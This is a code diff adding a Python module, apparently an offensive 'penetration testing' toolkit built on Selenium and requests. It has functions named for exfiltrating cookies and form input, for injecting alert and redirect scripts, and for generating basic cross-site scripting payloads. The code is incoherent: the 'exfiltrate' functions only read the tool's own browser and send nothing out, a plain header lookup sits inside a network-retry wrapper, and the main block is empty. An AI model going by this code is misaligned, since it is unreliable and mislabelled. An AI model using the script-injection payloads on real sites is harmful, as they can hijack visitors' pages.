@@ -1,0 +1,133 @@
+import logging
+import requests
+from selenium import webdriver
+from selenium.common.exceptions import WebDriverException
+import time
+import random
+
+logging.basicConfig(filename='penetration_testing.log', level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')
+
+def retry(exceptions, tries=4, delay=3, backoff=2, logger=None):
+    def deco_retry(f):
+        def f_retry(*args, **kwargs):
+            mtries, mdelay = tries, delay
+            while mtries > 1:
+                try:
+                    return f(*args, **kwargs)
+                except exceptions as e:
+                    msg = f"{e}, Retrying in {mdelay} seconds..."
+                    if logger:
+                        logger.warning(msg)
+                    else:
+                        print(msg)
+                    time.sleep(mdelay)
+                    mtries -= 1
+                    mdelay *= backoff
+            return f(*args, **kwargs)
+        return f_retry
+    return deco_retry
+
+@retry((requests.exceptions.RequestException,), logger=logging)
+def get_browser_info(request):
+    user_agent = request.headers.get('User-Agent')
+    return user_agent
+
+@retry((requests.exceptions.RequestException,), logger=logging)
+def get_geolocation(ip_address):
+    response = requests.get(f"http://ip-api.com/json/{ip_address}")
+    data = response.json()
+    if data['status'] == 'success':
+        return data['country'], data['regionName'], data['city']
+    else:
+        return None, None, None
+
+@retry((WebDriverException,), logger=logging)
+def take_screenshot(url):
+    options = webdriver.ChromeOptions()
+    options.add_argument('headless')
+    driver = webdriver.Chrome(options=options)
+    driver.get(url)
+    driver.save_screenshot('screenshot.png')
+    driver.quit()
+
+@retry((WebDriverException,), logger=logging)
+def get_page_source(url):
+    options = webdriver.ChromeOptions()
+    options.add_argument('headless')
+    driver = webdriver.Chrome(options=options)
+    driver.get(url)
+    source_code = driver.page_source
+    driver.quit()
+    return source_code
+
+@retry((WebDriverException,), logger=logging)
+def exfiltrate_input_data(url, input_id):
+    options = webdriver.ChromeOptions()
+    options.add_argument('headless')
+    driver = webdriver.Chrome(options=options)
+    driver.get(url)
+    input_element = driver.find_element_by_id(input_id)
+    input_data = input_element.get_attribute('value')
+    driver.quit()
+    return input_data
+
+
+@retry((WebDriverException,), logger=logging)
+def exfiltrate_cookies(url):
+    options = webdriver.ChromeOptions()
+    options.add_argument('headless')
+    driver = webdriver.Chrome(options=options)
+    driver.get(url)
+    cookies = driver.get_cookies()
+    driver.quit()
+    return cookies
+
+@retry((WebDriverException,), logger=logging)
+def display_alert(url, message):
+    options = webdriver.ChromeOptions()
+    options.add_argument('headless')
+    driver = webdriver.Chrome(options=options)
+    driver.get(url)
+    driver.execute_script(f"alert('{message}')")
+    driver.quit()
+
+@retry((WebDriverException,), logger=logging)
+def redirect_user(url, target_url):
+    options = webdriver.ChromeOptions()
+    options.add_argument('headless')
+    driver = webdriver.Chrome(options=options)
+    driver.get(url)
+    driver.execute_script(f"window.location.href = '{target_url}'")
+    driver.quit()
+
+def generate_xss_payload(payload_type, data):
+    try:
+        if payload_type == "alert":
+            return f"<script>alert('{data}');</script>"
+        elif payload_type == "redirect":
+            return f"<script>window.location.href='{data}';</script>"
+        else:
+            logging.error("Invalid payload type")
+            return None
+    except Exception as e:
+        logging.error(f"Error generating XSS payload: {e}")
+        return None
+
+def generate_report(findings):
+    try:
+        with open('penetration_testing_report.txt', 'w') as report_file:
+            report_file.write("Penetration Testing Report\n\n")
+            for category, items in findings.items():
+                report_file.write(f"{category}:\n")
+                for item in items:
+                    report_file.write(f"- {item}\n")
+                report_file.write("\n")
+        logging.info("Report generated successfully")
+    except Exception as e:
+        logging.error(f"Error generating report: {e}")
+
+if __name__ == "__main__":
+    try:
+        pass
+    except Exception as e:
+        logging.error(f"Unexpected error: {e}")
